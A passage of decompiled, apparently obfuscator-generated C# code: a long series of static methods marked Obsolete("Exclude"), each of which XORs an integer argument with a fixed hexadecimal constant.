	public static int smethod_5463(int int_4)
	{
		return int_4 ^ 0x4CB90C02;
	}

	[Obsolete("Exclude")]
	public static int smethod_5464(int int_4)
	{
		return int_4 ^ 0x79C47F38;
	}

	[Obsolete("Exclude")]
	public static int smethod_5465(int int_4)
	{
		return int_4 ^ 0x302B3610;
	}

	[Obsolete("Exclude")]
	public static int smethod_5466(int int_4)
	{
		return int_4 ^ 0x4E347E3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5467(int int_4)
	{
		return int_4 ^ 0x6A2AF13F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5468(int int_4)
	{
		return int_4 ^ 0x23274497;
	}

	[Obsolete("Exclude")]
	public static int smethod_5469(int int_4)
	{
		return int_4 ^ 0x232FF6EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5470(int int_4)
	{
		return int_4 ^ 0x34CC9127;
	}

	[Obsolete("Exclude")]
	public static int smethod_5471(int int_4)
	{
		return int_4 ^ 0x6B570AC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5472(int int_4)
	{
		return int_4 ^ 0x7F482F74;
	}

	[Obsolete("Exclude")]
	public static int smethod_5473(int int_4)
	{
		return int_4 ^ 0x3BD0E70F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5474(int int_4)
	{
		return int_4 ^ 0x8CD9C10;
	}

	[Obsolete("Exclude")]
	public static int smethod_5475(int int_4)
	{
		return int_4 ^ 0x4A464680;
	}

	[Obsolete("Exclude")]
	public static int smethod_5476(int int_4)
	{
		return int_4 ^ 0x43CC8D3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5477(int int_4)
	{
		return int_4 ^ 0x2D26F6F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5478(int int_4)
	{
		return int_4 ^ 0x73EE94B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5479(int int_4)
	{
		return int_4 ^ 0x80B657E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5480(int int_4)
	{
		return int_4 ^ 0x20E6CBFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5481(int int_4)
	{
		return int_4 ^ 0x2B6F2DDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5482(int int_4)
	{
		return int_4 ^ 0x7BACE1D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5483(int int_4)
	{
		return int_4 ^ 0x39907AE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5484(int int_4)
	{
		return int_4 ^ 0x3970603F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5485(int int_4)
	{
		return int_4 ^ 0x6C22C159;
	}

	[Obsolete("Exclude")]
	public static int smethod_5486(int int_4)
	{
		return int_4 ^ 0x68509AF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5487(int int_4)
	{
		return int_4 ^ 0xA743BA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5488(int int_4)
	{
		return int_4 ^ 0x3F05FFE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5489(int int_4)
	{
		return int_4 ^ 0x7789AF35;
	}

	[Obsolete("Exclude")]
	public static int smethod_5490(int int_4)
	{
		return int_4 ^ 0x60DAF568;
	}

	[Obsolete("Exclude")]
	public static int smethod_5491(int int_4)
	{
		return int_4 ^ 0x218DFE7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5492(int int_4)
	{
		return int_4 ^ 0x661E78B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5493(int int_4)
	{
		return int_4 ^ 0x2DABFBFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5494(int int_4)
	{
		return int_4 ^ 0x5406ED75;
	}

	[Obsolete("Exclude")]
	public static int smethod_5495(int int_4)
	{
		return int_4 ^ 0x6A34AACB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5496(int int_4)
	{
		return int_4 ^ 0x434AEE42;
	}

	[Obsolete("Exclude")]
	public static int smethod_5497(int int_4)
	{
		return int_4 ^ 0x57D68ED5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5498(int int_4)
	{
		return int_4 ^ 0x68851C87;
	}

	[Obsolete("Exclude")]
	public static int smethod_5499(int int_4)
	{
		return int_4 ^ 0x3A9E1823;
	}

	[Obsolete("Exclude")]
	public static int smethod_5500(int int_4)
	{
		return int_4 ^ 0x1E95F893;
	}

	[Obsolete("Exclude")]
	public static int smethod_5501(int int_4)
	{
		return int_4 ^ 0x65DAE055;
	}

	[Obsolete("Exclude")]
	public static int smethod_5502(int int_4)
	{
		return int_4 ^ 0x182F1AC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5503(int int_4)
	{
		return int_4 ^ 0x6138F1BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5504(int int_4)
	{
		return int_4 ^ 0x598D9036;
	}

	[Obsolete("Exclude")]
	public static int smethod_5505(int int_4)
	{
		return int_4 ^ 0x40156D41;
	}

	[Obsolete("Exclude")]
	public static int smethod_5506(int int_4)
	{
		return int_4 ^ 0x7330EEDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5507(int int_4)
	{
		return int_4 ^ 0x3C8D92AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5508(int int_4)
	{
		return int_4 ^ 0x4271658A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5509(int int_4)
	{
		return int_4 ^ 0x380F7029;
	}

	[Obsolete("Exclude")]
	public static int smethod_5510(int int_4)
	{
		return int_4 ^ 0x447009D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5511(int int_4)
	{
		return int_4 ^ 0x14C1B884;
	}

	[Obsolete("Exclude")]
	public static int smethod_5512(int int_4)
	{
		return int_4 ^ 0x436D123A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5513(int int_4)
	{
		return int_4 ^ 0x1DD552A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5514(int int_4)
	{
		return int_4 ^ 0x43F0B406;
	}

	[Obsolete("Exclude")]
	public static int smethod_5515(int int_4)
	{
		return int_4 ^ 0x39F70E93;
	}

	[Obsolete("Exclude")]
	public static int smethod_5516(int int_4)
	{
		return int_4 ^ 0x3766AD18;
	}

	[Obsolete("Exclude")]
	public static int smethod_5518(int int_4)
	{
		return int_4 ^ 0x25BEA7BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5519(int int_4)
	{
		return int_4 ^ 0x331C218D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5520(int int_4)
	{
		return int_4 ^ 0x29197967;
	}

	[Obsolete("Exclude")]
	public static int smethod_5521(int int_4)
	{
		return int_4 ^ 0x4788A090;
	}

	[Obsolete("Exclude")]
	public static int smethod_5523(int int_4)
	{
		return int_4 ^ 0x25C97A5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5524(int int_4)
	{
		return int_4 ^ 0x3F4D1C15;
	}

	[Obsolete("Exclude")]
	public static int smethod_5525(int int_4)
	{
		return int_4 ^ 0x5297CB14;
	}

	[Obsolete("Exclude")]
	public static int smethod_5526(int int_4)
	{
		return int_4 ^ 0x420E6D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5527(int int_4)
	{
		return int_4 ^ 0x777376E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5528(int int_4)
	{
		return int_4 ^ 0x247A8783;
	}

	[Obsolete("Exclude")]
	public static int smethod_5529(int int_4)
	{
		return int_4 ^ 0xEE522E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5530(int int_4)
	{
		return int_4 ^ 0x34725A7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5531(int int_4)
	{
		return int_4 ^ 0x2311B3B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5532(int int_4)
	{
		return int_4 ^ 0xA11724;
	}

	[Obsolete("Exclude")]
	public static int smethod_5533(int int_4)
	{
		return int_4 ^ 0x2A3EEBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5534(int int_4)
	{
		return int_4 ^ 0x1D037640;
	}

	[Obsolete("Exclude")]
	public static int smethod_5535(int int_4)
	{
		return int_4 ^ 0x32F9DFC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5536(int int_4)
	{
		return int_4 ^ 0x798DD002;
	}

	[Obsolete("Exclude")]
	public static int smethod_5537(int int_4)
	{
		return int_4 ^ 0x46BF8651;
	}

	[Obsolete("Exclude")]
	public static int smethod_5538(int int_4)
	{
		return int_4 ^ 0x13CE0402;
	}

	[Obsolete("Exclude")]
	public static int smethod_5539(int int_4)
	{
		return int_4 ^ 0x149BD946;
	}

	[Obsolete("Exclude")]
	public static int smethod_5540(int int_4)
	{
		return int_4 ^ 0xC6AADF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5541(int int_4)
	{
		return int_4 ^ 0x3FAE146B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5542(int int_4)
	{
		return int_4 ^ 0x298BA7E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5543(int int_4)
	{
		return int_4 ^ 0x783A0C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5544(int int_4)
	{
		return int_4 ^ 0x2A6C46A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5545(int int_4)
	{
		return int_4 ^ 0x1AB01FBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5546(int int_4)
	{
		return int_4 ^ 0x38AE70FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5547(int int_4)
	{
		return int_4 ^ 0x45966864;
	}

	[Obsolete("Exclude")]
	public static int smethod_5548(int int_4)
	{
		return int_4 ^ 0x7F852F20;
	}

	[Obsolete("Exclude")]
	public static int smethod_5549(int int_4)
	{
		return int_4 ^ 0x4E6C2C9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5550(int int_4)
	{
		return int_4 ^ 0x295312AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5551(int int_4)
	{
		return int_4 ^ 0x13B28B25;
	}

	[Obsolete("Exclude")]
	public static int smethod_5552(int int_4)
	{
		return int_4 ^ 0x69D02E09;
	}

	[Obsolete("Exclude")]
	public static int smethod_5553(int int_4)
	{
		return int_4 ^ 0x7CD36BED;
	}

	[Obsolete("Exclude")]
	public static int smethod_5555(int int_4)
	{
		return int_4 ^ 0x28FD0CDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5556(int int_4)
	{
		return int_4 ^ 0x589B1810;
	}

	[Obsolete("Exclude")]
	public static int smethod_5557(int int_4)
	{
		return int_4 ^ 0x1D06F900;
	}

	[Obsolete("Exclude")]
	public static int smethod_5558(int int_4)
	{
		return int_4 ^ 0x1ACFDBAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5559(int int_4)
	{
		return int_4 ^ 0x2195626B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5560(int int_4)
	{
		return int_4 ^ 0xAAF1DF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5561(int int_4)
	{
		return int_4 ^ 0x16A203F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5562(int int_4)
	{
		return int_4 ^ 0x36728DE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5563(int int_4)
	{
		return int_4 ^ 0x704E7622;
	}

	[Obsolete("Exclude")]
	public static int smethod_5565(int int_4)
	{
		return int_4 ^ 0x28D8200B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5566(int int_4)
	{
		return int_4 ^ 0x454EE386;
	}

	[Obsolete("Exclude")]
	public static int smethod_5567(int int_4)
	{
		return int_4 ^ 0x60FC9D84;
	}

	[Obsolete("Exclude")]
	public static int smethod_5568(int int_4)
	{
		return int_4 ^ 0x511E5578;
	}

	[Obsolete("Exclude")]
	public static int smethod_5569(int int_4)
	{
		return int_4 ^ 0x2E86B2EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5570(int int_4)
	{
		return int_4 ^ 0x34885D1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5571(int int_4)
	{
		return int_4 ^ 0x2D41479A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5572(int int_4)
	{
		return int_4 ^ 0x62533F27;
	}

	[Obsolete("Exclude")]
	public static int smethod_5573(int int_4)
	{
		return int_4 ^ 0x467941B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5574(int int_4)
	{
		return int_4 ^ 0x329C945D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5575(int int_4)
	{
		return int_4 ^ 0x413FF6DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5576(int int_4)
	{
		return int_4 ^ 0x7287DDA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5577(int int_4)
	{
		return int_4 ^ 0x7DB7BE9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5578(int int_4)
	{
		return int_4 ^ 0x514EB20B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5579(int int_4)
	{
		return int_4 ^ 0x8C6CAF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5580(int int_4)
	{
		return int_4 ^ 0x5F601C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5581(int int_4)
	{
		return int_4 ^ 0x4A713B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5582(int int_4)
	{
		return int_4 ^ 0x59EDEB62;
	}

	[Obsolete("Exclude")]
	public static int smethod_5583(int int_4)
	{
		return int_4 ^ 0x7254EE73;
	}

	[Obsolete("Exclude")]
	public static int smethod_5584(int int_4)
	{
		return int_4 ^ 0x7FC65334;
	}

	[Obsolete("Exclude")]
	public static int smethod_5585(int int_4)
	{
		return int_4 ^ 0x142360FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5586(int int_4)
	{
		return int_4 ^ 0x64A7D6A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5587(int int_4)
	{
		return int_4 ^ 0x7803B75D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5588(int int_4)
	{
		return int_4 ^ 0x10EA8B5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5589(int int_4)
	{
		return int_4 ^ 0x4B9349C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5590(int int_4)
	{
		return int_4 ^ 0x68CED6FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5591(int int_4)
	{
		return int_4 ^ 0x1D7FD8D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5592(int int_4)
	{
		return int_4 ^ 0x30894651;
	}

	[Obsolete("Exclude")]
	public static int smethod_5593(int int_4)
	{
		return int_4 ^ 0x3F541AF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5594(int int_4)
	{
		return int_4 ^ 0x2BA242FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5595(int int_4)
	{
		return int_4 ^ 0x55352CA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5596(int int_4)
	{
		return int_4 ^ 0x1BDFB2B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5597(int int_4)
	{
		return int_4 ^ 0x2D1DB1E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5598(int int_4)
	{
		return int_4 ^ 0x6335482A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5599(int int_4)
	{
		return int_4 ^ 0x4930F8CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5600(int int_4)
	{
		return int_4 ^ 0xD3A86EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5601(int int_4)
	{
		return int_4 ^ 0x53698315;
	}

	[Obsolete("Exclude")]
	public static int smethod_5602(int int_4)
	{
		return int_4 ^ 0x571FD3EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5603(int int_4)
	{
		return int_4 ^ 0x67A16B1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5604(int int_4)
	{
		return int_4 ^ 0x802EFAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5605(int int_4)
	{
		return int_4 ^ 0x1EADF9D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5607(int int_4)
	{
		return int_4 ^ 0x7A3E99D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5608(int int_4)
	{
		return int_4 ^ 0x23A576D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5609(int int_4)
	{
		return int_4 ^ 0x681CEF26;
	}

	[Obsolete("Exclude")]
	public static int smethod_5610(int int_4)
	{
		return int_4 ^ 0x460B38BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5611(int int_4)
	{
		return int_4 ^ 0x43F22C54;
	}

	[Obsolete("Exclude")]
	public static int smethod_5612(int int_4)
	{
		return int_4 ^ 0xB853940;
	}

	[Obsolete("Exclude")]
	public static int smethod_5613(int int_4)
	{
		return int_4 ^ 0x30E12991;
	}

	[Obsolete("Exclude")]
	public static int smethod_5614(int int_4)
	{
		return int_4 ^ 0x4292272B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5615(int int_4)
	{
		return int_4 ^ 0x487AEA58;
	}

	[Obsolete("Exclude")]
	public static int smethod_5616(int int_4)
	{
		return int_4 ^ 0x3F3A8B42;
	}

	[Obsolete("Exclude")]
	public static int smethod_5617(int int_4)
	{
		return int_4 ^ 0x533087EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5618(int int_4)
	{
		return int_4 ^ 0x117C841;
	}

	[Obsolete("Exclude")]
	public static int smethod_5619(int int_4)
	{
		return int_4 ^ 0x6B9CC199;
	}

	[Obsolete("Exclude")]
	public static int smethod_5620(int int_4)
	{
		return int_4 ^ 0x5BF7EE19;
	}

	[Obsolete("Exclude")]
	public static int smethod_5621(int int_4)
	{
		return int_4 ^ 0x5641447F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5622(int int_4)
	{
		return int_4 ^ 0x1C4B5279;
	}

	[Obsolete("Exclude")]
	public static int smethod_5623(int int_4)
	{
		return int_4 ^ 0x722F2A6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5624(int int_4)
	{
		return int_4 ^ 0x2954A88D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5625(int int_4)
	{
		return int_4 ^ 0x39B6A38D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5626(int int_4)
	{
		return int_4 ^ 0x1F88EAEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5627(int int_4)
	{
		return int_4 ^ 0x3DE1B30A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5628(int int_4)
	{
		return int_4 ^ 0x75316B31;
	}

	[Obsolete("Exclude")]
	public static int smethod_5629(int int_4)
	{
		return int_4 ^ 0x271382A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5630(int int_4)
	{
		return int_4 ^ 0x20754ED1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5631(int int_4)
	{
		return int_4 ^ 0x14B8EAF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5632(int int_4)
	{
		return int_4 ^ 0x2A69DC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5633(int int_4)
	{
		return int_4 ^ 0x64B37E7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5635(int int_4)
	{
		return int_4 ^ 0x5EC985C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5636(int int_4)
	{
		return int_4 ^ 0x5D244573;
	}

	[Obsolete("Exclude")]
	public static int smethod_5637(int int_4)
	{
		return int_4 ^ 0x72125060;
	}

	[Obsolete("Exclude")]
	public static int smethod_5639(int int_4)
	{
		return int_4 ^ 0x7E517417;
	}

	[Obsolete("Exclude")]
	public static int smethod_5640(int int_4)
	{
		return int_4 ^ 0x641DA0A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5642(int int_4)
	{
		return int_4 ^ 0x2E743CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5643(int int_4)
	{
		return int_4 ^ 0x4C2D8A16;
	}

	[Obsolete("Exclude")]
	public static int smethod_5644(int int_4)
	{
		return int_4 ^ 0x1421FC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5645(int int_4)
	{
		return int_4 ^ 0x17270A23;
	}

	[Obsolete("Exclude")]
	public static int smethod_5646(int int_4)
	{
		return int_4 ^ 0x6B21B5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5647(int int_4)
	{
		return int_4 ^ 0x8A7DBA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5648(int int_4)
	{
		return int_4 ^ 0x12858F63;
	}

	[Obsolete("Exclude")]
	public static int smethod_5649(int int_4)
	{
		return int_4 ^ 0x36DEA032;
	}

	[Obsolete("Exclude")]
	public static int smethod_5650(int int_4)
	{
		return int_4 ^ 0x4BC51CD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5651(int int_4)
	{
		return int_4 ^ 0x543376A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5652(int int_4)
	{
		return int_4 ^ 0x4F2BC7A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5653(int int_4)
	{
		return int_4 ^ 0x18C36163;
	}

	[Obsolete("Exclude")]
	public static int smethod_5654(int int_4)
	{
		return int_4 ^ 0x51FD781B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5655(int int_4)
	{
		return int_4 ^ 0x2752C65C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5656(int int_4)
	{
		return int_4 ^ 0xE9A4F8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5657(int int_4)
	{
		return int_4 ^ 0x658A63E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5658(int int_4)
	{
		return int_4 ^ 0x545C1DDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5659(int int_4)
	{
		return int_4 ^ 0x490A35C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5660(int int_4)
	{
		return int_4 ^ 0x69AEA96D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5661(int int_4)
	{
		return int_4 ^ 0x52DF853C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5662(int int_4)
	{
		return int_4 ^ 0x7D14BA86;
	}

	[Obsolete("Exclude")]
	public static int smethod_5663(int int_4)
	{
		return int_4 ^ 0x46CF8D4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5664(int int_4)
	{
		return int_4 ^ 0x36BE5482;
	}

	[Obsolete("Exclude")]
	public static int smethod_5665(int int_4)
	{
		return int_4 ^ 0x41DD7FFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5666(int int_4)
	{
		return int_4 ^ 0x5D9F85FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5667(int int_4)
	{
		return int_4 ^ 0x6493F9AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5668(int int_4)
	{
		return int_4 ^ 0x3BDD794C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5669(int int_4)
	{
		return int_4 ^ 0x46547346;
	}

	[Obsolete("Exclude")]
	public static int smethod_5670(int int_4)
	{
		return int_4 ^ 0x3290D6A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5671(int int_4)
	{
		return int_4 ^ 0x5D1B4BB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5672(int int_4)
	{
		return int_4 ^ 0x6018858E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5673(int int_4)
	{
		return int_4 ^ 0x39BD1D36;
	}

	[Obsolete("Exclude")]
	public static int smethod_5674(int int_4)
	{
		return int_4 ^ 0x2021F2F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5675(int int_4)
	{
		return int_4 ^ 0x7ABBB5AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5676(int int_4)
	{
		return int_4 ^ 0x3446E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5677(int int_4)
	{
		return int_4 ^ 0x779C492F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5678(int int_4)
	{
		return int_4 ^ 0x663B5026;
	}

	[Obsolete("Exclude")]
	public static int smethod_5679(int int_4)
	{
		return int_4 ^ 0x4A6E727F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5680(int int_4)
	{
		return int_4 ^ 0x6736ADD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5681(int int_4)
	{
		return int_4 ^ 0x3B4F04F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5682(int int_4)
	{
		return int_4 ^ 0x61DD2F5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5683(int int_4)
	{
		return int_4 ^ 0x56620B5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5684(int int_4)
	{
		return int_4 ^ 0x12F18AA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5685(int int_4)
	{
		return int_4 ^ 0x7ED86BDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5686(int int_4)
	{
		return int_4 ^ 0xF0F7BCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5687(int int_4)
	{
		return int_4 ^ 0x4A140434;
	}

	[Obsolete("Exclude")]
	public static int smethod_5688(int int_4)
	{
		return int_4 ^ 0x6517DEBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5689(int int_4)
	{
		return int_4 ^ 0x7B4C11CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5690(int int_4)
	{
		return int_4 ^ 0x20E45A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5691(int int_4)
	{
		return int_4 ^ 0x33DE436;
	}

	[Obsolete("Exclude")]
	public static int smethod_5693(int int_4)
	{
		return int_4 ^ 0x3469AE7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5694(int int_4)
	{
		return int_4 ^ 0x2484720B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5695(int int_4)
	{
		return int_4 ^ 0xD2ABBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5696(int int_4)
	{
		return int_4 ^ 0x45E28DAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5697(int int_4)
	{
		return int_4 ^ 0x3F70D33D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5698(int int_4)
	{
		return int_4 ^ 0x6C864605;
	}

	[Obsolete("Exclude")]
	public static int smethod_5699(int int_4)
	{
		return int_4 ^ 0x104DA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5700(int int_4)
	{
		return int_4 ^ 0x13472B1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5701(int int_4)
	{
		return int_4 ^ 0x4E864A97;
	}

	[Obsolete("Exclude")]
	public static int smethod_5702(int int_4)
	{
		return int_4 ^ 0x637A69F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5703(int int_4)
	{
		return int_4 ^ 0x3B330083;
	}

	[Obsolete("Exclude")]
	public static int smethod_5704(int int_4)
	{
		return int_4 ^ 0x48B6E5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5705(int int_4)
	{
		return int_4 ^ 0x40A6D449;
	}

	[Obsolete("Exclude")]
	public static int smethod_5706(int int_4)
	{
		return int_4 ^ 0xA5885BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5707(int int_4)
	{
		return int_4 ^ 0x53BCB8B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5708(int int_4)
	{
		return int_4 ^ 0x5A7A9087;
	}

	[Obsolete("Exclude")]
	public static int smethod_5709(int int_4)
	{
		return int_4 ^ 0x6EC17020;
	}

	[Obsolete("Exclude")]
	public static int smethod_5712(int int_4)
	{
		return int_4 ^ 0x1CB66DC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5713(int int_4)
	{
		return int_4 ^ 0xFC43F30;
	}

	[Obsolete("Exclude")]
	public static int smethod_5714(int int_4)
	{
		return int_4 ^ 0x4FEE99F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5715(int int_4)
	{
		return int_4 ^ 0x7BF0F14A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5716(int int_4)
	{
		return int_4 ^ 0x7B14D7C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5717(int int_4)
	{
		return int_4 ^ 0x1DC3AC29;
	}

	[Obsolete("Exclude")]
	public static int smethod_5718(int int_4)
	{
		return int_4 ^ 0x2E50613;
	}

	[Obsolete("Exclude")]
	public static int smethod_5719(int int_4)
	{
		return int_4 ^ 0x122538D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5720(int int_4)
	{
		return int_4 ^ 0x366F8914;
	}

	[Obsolete("Exclude")]
	public static int smethod_5721(int int_4)
	{
		return int_4 ^ 0x491B7617;
	}

	[Obsolete("Exclude")]
	public static int smethod_5722(int int_4)
	{
		return int_4 ^ 0x51288862;
	}

	[Obsolete("Exclude")]
	public static int smethod_5723(int int_4)
	{
		return int_4 ^ 0x5F08CEC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5724(int int_4)
	{
		return int_4 ^ 0x5B5F8B5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5725(int int_4)
	{
		return int_4 ^ 0x132C3F2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5726(int int_4)
	{
		return int_4 ^ 0x5ABCD8A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5727(int int_4)
	{
		return int_4 ^ 0xAF7F27A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5728(int int_4)
	{
		return int_4 ^ 0x573FAB40;
	}

	[Obsolete("Exclude")]
	public static int smethod_5729(int int_4)
	{
		return int_4 ^ 0x2D3FAB93;
	}

	[Obsolete("Exclude")]
	public static int smethod_5730(int int_4)
	{
		return int_4 ^ 0x6C42EB05;
	}

	[Obsolete("Exclude")]
	public static int smethod_5731(int int_4)
	{
		return int_4 ^ 0x470FEDD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5732(int int_4)
	{
		return int_4 ^ 0x18266976;
	}

	[Obsolete("Exclude")]
	public static int smethod_5733(int int_4)
	{
		return int_4 ^ 0x660A8B54;
	}

	[Obsolete("Exclude")]
	public static int smethod_5734(int int_4)
	{
		return int_4 ^ 0x47D08EA5;
	}

	[Obsolete("Exclude")]
